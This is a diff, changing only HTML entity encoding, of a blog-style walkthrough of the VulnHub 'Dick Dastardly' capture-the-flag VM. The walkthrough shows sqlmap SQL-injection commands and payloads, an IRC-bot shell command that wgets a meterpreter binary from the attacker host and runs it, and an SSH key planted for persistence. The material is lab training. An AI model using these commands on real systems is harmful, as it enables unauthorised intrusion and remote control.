@@ -161,7 +161,7 @@ HTTP/1.1 200 OK
 Date: Sun, 08 Jan 2017 21:48:34 GMT
 Server: Apache/2.4.7 (Ubuntu)
 Last-Modified: Mon, 17 Oct 2016 16:04:49 GMT
-ETag: &quot;1eb-53f11bc50cf74&quot;
+ETag: &#34;1eb-53f11bc50cf74&#34;
 Accept-Ranges: bytes
 Content-Length: 491
 Vary: Accept-Encoding
@@ -183,29 +183,29 @@ GENERATED WORDS: 20458
 </code></pre><p>After opening <code>index.php</code> in a browser we see a simple guestbook application and a feature to report issues under <code>report.php</code>.</p>
 <p><img src="/img/vulnhub_dc416_dick_dastardly/admin_login.png" alt="Admin Login"></p>
 <p>By playing around with the parameters of the guestbook to see if it&rsquo;s vulnerable to XSS it seems that there is some filtering and escaping in place. So let&rsquo;s try <code>sqlmap</code> and see if it can find any SQL-Injection vulnerabilities.</p>
-<pre tabindex="0"><code>sqlmap -u http://192.168.56.2/index.php --data &quot;name=asd&amp;msg=asd&quot; --level=5 --risk=3 --batch
+<pre tabindex="0"><code>sqlmap -u http://192.168.56.2/index.php --data &#34;name=asd&amp;msg=asd&#34; --level=5 --risk=3 --batch
 </code></pre><p>After running this command I could not see any new entries on the guestbook page so it looks like all requests were blocked. <code>sqlmap</code> sends it&rsquo;s own user agent on every request containing the tool name so maybe the server is blocking these requests. The user agent can be randomized with the <code>--random-agent</code> option so let&rsquo;s give it another try:</p>
-<pre tabindex="0"><code>sqlmap -u http://192.168.56.2/index.php --data &quot;name=asd&amp;msg=asd&quot; --level=5 --risk=3 --random-agent --batch
+<pre tabindex="0"><code>sqlmap -u http://192.168.56.2/index.php --data &#34;name=asd&amp;msg=asd&#34; --level=5 --risk=3 --random-agent --batch
 </code></pre><p>Bingo:</p>
 <pre tabindex="0"><code>sqlmap identified the following injection point(s) with a total of 7776 HTTP(s) requests:
 ---
 Parameter: name (POST)
     Type: AND/OR time-based blind
     Title: MySQL &gt;= 5.0.12 AND time-based blind
-    Payload: name=asd'||(SELECT 'RbDO' FROM DUAL WHERE 4795=4795 AND SLEEP(5))||'&amp;msg=asd
+    Payload: name=asd&#39;||(SELECT &#39;RbDO&#39; FROM DUAL WHERE 4795=4795 AND SLEEP(5))||&#39;&amp;msg=asd
 ---
 </code></pre><p>Let&rsquo;s also test the <code>report.php</code> file for SQL-Injection issues:</p>
-<pre tabindex="0"><code>sqlmap -u http://192.168.56.2/report.php --data=&quot;issue=asdf&quot; --random-agent --level=5 --risk=3
+<pre tabindex="0"><code>sqlmap -u http://192.168.56.2/report.php --data=&#34;issue=asdf&#34; --random-agent --level=5 --risk=3
 </code></pre><pre tabindex="0"><code>sqlmap identified the following injection point(s) with a total of 142 HTTP(s) requests:
 ---
 Parameter: issue (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: issue=asdf'||(SELECT 'oYQt' FROM DUAL WHERE 9026=9026 AND 7350=7350)||'
+    Payload: issue=asdf&#39;||(SELECT &#39;oYQt&#39; FROM DUAL WHERE 9026=9026 AND 7350=7350)||&#39;
 
     Type: AND/OR time-based blind
     Title: MySQL &gt;= 5.0.12 AND time-based blind
-    Payload: issue=asdf'||(SELECT 'RdBC' FROM DUAL WHERE 9919=9919 AND SLEEP(5))||'
+    Payload: issue=asdf&#39;||(SELECT &#39;RdBC&#39; FROM DUAL WHERE 9919=9919 AND SLEEP(5))||&#39;
 ---
 </code></pre><p>So we have found 2 time based and one boolean based blind injection. We will use the vulnerability in <code>report.php</code> to dump the database as the boolean based blind attack is a lot faster then the time based attack.</p>
 <p>So let&rsquo;s enumerate the available DBs using the <code>--dbs</code> parameter:</p>
@@ -247,7 +247,7 @@ Table: admins
 |   uptime: 0 days, 0:53:58
 |   source ident: NONE or BLOCKED
 |   source host: 192.168.56.3
-|_  error: Closing Link: jgjxeujeu[~nmap@192.168.56.3] (&quot;&quot;)
+|_  error: Closing Link: jgjxeujeu[~nmap@192.168.56.3] (&#34;&#34;)
 </code></pre><p>We also have an option to add an <code>Supybot Owner</code> so lets add the user <code>test</code> with the password <code>test</code> but nothing happens. So we try to activate the <code>Supybot</code> and have a look at the IRC server.</p>
 <p>I installed <code>weechat</code> on my kali vm, started it and configured it the following way:</p>
 <pre tabindex="0"><code>/server add vulnhub 192.168.56.2
@@ -269,30 +269,30 @@ Table: admins
 21:10:08 vulnhub  -- | End of LIST
 </code></pre><p>So let&rsquo;s join the <code>#vulnhub</code> channel with <code>/join #vulnhub</code>. We are seeing a user named <code>vulnhub-bot</code> which seems to be the bot we activated on the admin interface.</p>
 <p>We can now query the user to start a private conversation with it by issuing <code>/query vulnhub-bot</code>. After writing something we get the message</p>
-<pre tabindex="0"><code>vulnhub-bot: Error: &quot;test&quot; is not a valid command.
+<pre tabindex="0"><code>vulnhub-bot: Error: &#34;test&#34; is not a valid command.
 </code></pre><p>By trying <code>help</code> we get a help menu:</p>
 <pre tabindex="0"><code>21:21:00   -- | vulnhub-bot: (help [&lt;plugin&gt;] [&lt;command&gt;]) -- This command gives a useful description of what &lt;command&gt; does. &lt;plugin&gt; is only necessary if the command is in more than one plugin. You may also
-              | want to use the 'list' command to list all available plugins and commands.
+              | want to use the &#39;list&#39; command to list all available plugins and commands.
 </code></pre><p>So let&rsquo;s execute the mentioned <code>list</code> command:</p>
 <pre tabindex="0"><code>21:21:13   -- | vulnhub-bot: Admin, AutoMode, Channel, Config, Misc, NickAuth, Owner, Unix, User, and Utilities
 </code></pre><p>By looking at all the plugins in detail a <code>list Unix</code> reveals a <code>shell</code> method:</p>
 <pre tabindex="0"><code>21:22:20   -- | vulnhub-bot: call, crypt, errno, fortune, pid, ping, ping6, progstats, shell, spell, sysuname, sysuptime, and wtf
 </code></pre><p>So let&rsquo;s try the <code>shell</code> command:</p>
 <pre tabindex="0"><code>22:25:16 root | Unix shell
-22:25:17   -- | vulnhub-bot: Error: You don't have the owner capability. If you think that you should have this capability, be sure that you are identified before trying again. The 'whoami' command can tell you
-              | if you're identified.
+22:25:17   -- | vulnhub-bot: Error: You don&#39;t have the owner capability. If you think that you should have this capability, be sure that you are identified before trying again. The &#39;whoami&#39; command can tell you
+              | if you&#39;re identified.
 </code></pre><p>Crap, so <code>whoami</code>?</p>
 <pre tabindex="0"><code>21:22:44 root | whoami
-21:22:44   -- | vulnhub-bot: I don't recognize you. You can message me either of these two commands: &quot;user identify &lt;username&gt; &lt;password&gt;&quot; to log in or &quot;user register &lt;username&gt; &lt;password&gt;&quot; to register.
+21:22:44   -- | vulnhub-bot: I don&#39;t recognize you. You can message me either of these two commands: &#34;user identify &lt;username&gt; &lt;password&gt;&#34; to log in or &#34;user register &lt;username&gt; &lt;password&gt;&#34; to register.
 </code></pre><p>Ok let&rsquo;s try the credentials from the user we added in the admin dialog:</p>
 <pre tabindex="0"><code>21:23:16 root | user identify test test
 21:23:16   -- | vulnhub-bot: The operation succeeded.
 21:23:19 root | shell
 21:23:20   -- | vulnhub-bot: (shell &lt;command to call with any arguments&gt;) -- Calls any command available on the system using the shell specified by the SHELL environment variable, and returns its output.
-              | Requires owner capability. Note that being restricted to owner, this command does not do any sanity checking on input/output. So it is up to you to make sure you don't run anything that will
+              | Requires owner capability. Note that being restricted to owner, this command does not do any sanity checking on input/output. So it is up to you to make sure you don&#39;t run anything that will
               | spamify your channel or that will bring your (1 more message)
 </code></pre><p>So let&rsquo;s download a meterpreter shell and start it:</p>
-<pre tabindex="0"><code>shell &quot;/usr/bin/rm -f /tmp/meterpreter ; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter&quot;
+<pre tabindex="0"><code>shell &#34;/usr/bin/rm -f /tmp/meterpreter ; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter&#34;
 </code></pre><pre tabindex="0"><code>meterpreter &gt; sysinfo
 Computer     : 192.168.56.2
 OS           : Ubuntu 14.04 (Linux 3.13.0-101-generic)
@@ -300,10 +300,10 @@ Architecture : x64
 Meterpreter  : x86/linux
 </code></pre><p>Now we can get the next flag</p>
 <pre tabindex="0"><code>cat flag2
-flag2{y0u'r3_4_5upyb07_n00b_m8}
+flag2{y0u&#39;r3_4_5upyb07_n00b_m8}
 </code></pre><p>Let&rsquo;s also add a SSH key to the <code>authorized_keys</code> so we can have a look with a proper shell as the user <code>rasta</code></p>
 <pre tabindex="0"><code>mkdir ~/.ssh
-echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyXvfW0bhRfSIPDn6kHkn8qggMuDKTTMJEFweBWv7qJ5FKB+QbmfsjASOQPZBIsc6248pCUm3yfzfvRAUyXICD4Dcsz+Zex9TAKJFLc4W6dglZlEchOqFKWE8bpWHgzf4shFh/2/utcWtAxMJb+5+uYGyATBtjWeB3BsLVGaB3djow6ymxdl/V40qR/xOzfoO2U2mDJrG8iYPVkSHs2Rcfu0vnEb5XOWZ7qvhUgrmh/c/M5kNjH6f5/KJJkKXAfcMDwRV81EpznNOD2ddJxXBzgzpYU5zx21GDrTQE76N5NJR9L9ePtorVHWDAn8bfKo7K3Y2n4LjO8wL/cFVlXdd/ root@kali&quot; &gt; ~/.ssh/authorized_keys
+echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyXvfW0bhRfSIPDn6kHkn8qggMuDKTTMJEFweBWv7qJ5FKB+QbmfsjASOQPZBIsc6248pCUm3yfzfvRAUyXICD4Dcsz+Zex9TAKJFLc4W6dglZlEchOqFKWE8bpWHgzf4shFh/2/utcWtAxMJb+5+uYGyATBtjWeB3BsLVGaB3djow6ymxdl/V40qR/xOzfoO2U2mDJrG8iYPVkSHs2Rcfu0vnEb5XOWZ7qvhUgrmh/c/M5kNjH6f5/KJJkKXAfcMDwRV81EpznNOD2ddJxXBzgzpYU5zx21GDrTQE76N5NJR9L9ePtorVHWDAn8bfKo7K3Y2n4LjO8wL/cFVlXdd/ root@kali&#34; &gt; ~/.ssh/authorized_keys
 </code></pre><h1 id="flag3">flag3</h1>
 <p>After having a look at the users sudo rights we can see we are allowed to run a python script as the user <code>vulnhub</code>:</p>
 <pre tabindex="0"><code>rasta@DickDastardly:/home$ sudo -l
@@ -344,8 +344,8 @@ flag3{n3x7_71m3_54n17153_y0ur_1npu7}
 <pre tabindex="0"><code>root      1046  0.0  0.1  17976  1480 ?        S    20:08   0:00 /bin/bash /root/ping.sh 2
 root      5463  0.0  0.0   6500   632 ?        S    21:44   0:00  \_ ping -c 1 -b 192.168.56.255 -p 725f796f755f6265636f6d655f746865 2
 </code></pre><p>Decoding the data as hex reveals</p>
-<pre tabindex="0"><code>&gt;&gt;&gt; &quot;725f796f755f6265636f6d655f746865&quot;.decode(&quot;hex&quot;)
-'r_you_become_the'
+<pre tabindex="0"><code>&gt;&gt;&gt; &#34;725f796f755f6265636f6d655f746865&#34;.decode(&#34;hex&#34;)
+&#39;r_you_become_the&#39;
 </code></pre><p>So this looks like the part of our flag. After looking at the process list again we can see the data portion of the ping command changes regularly.</p>
 <p>After extracting all values manually we can decode the last flag:</p>
 <pre tabindex="0"><code>666c6167307b7468655f717569657465
@@ -353,13 +353,13 @@ root      5463  0.0  0.0   6500   632 ?        S    21:44   0:00  \_ ping -c 1 -
 5f6d6f72655f796f755f6172655f6162
 6c655f746f5f686561727d
 
-&gt;&gt;&gt; &quot;666c6167307b7468655f717569657465725f796f755f6265636f6d655f7468655f6d6f72655f796f755f6172655f61626c655f746f5f686561727d&quot;.decode(&quot;hex&quot;)
-'flag0{the_quieter_you_become_the_more_you_are_able_to_hear}'
+&gt;&gt;&gt; &#34;666c6167307b7468655f717569657465725f796f755f6265636f6d655f7468655f6d6f72655f796f755f6172655f61626c655f746f5f686561727d&#34;.decode(&#34;hex&#34;)
+&#39;flag0{the_quieter_you_become_the_more_you_are_able_to_hear}&#39;
 </code></pre><h1 id="flags">flags</h1>
 <p>The flags:</p>
 <pre tabindex="0"><code>flag0{the_quieter_you_become_the_more_you_are_able_to_hear}
 flag1{l0l_h0w_345y_15_7h15_c7f}
-flag2{y0u'r3_4_5upyb07_n00b_m8}
+flag2{y0u&#39;r3_4_5upyb07_n00b_m8}
 flag3{n3x7_71m3_54n17153_y0ur_1npu7}
 </code></pre>
                     </div>
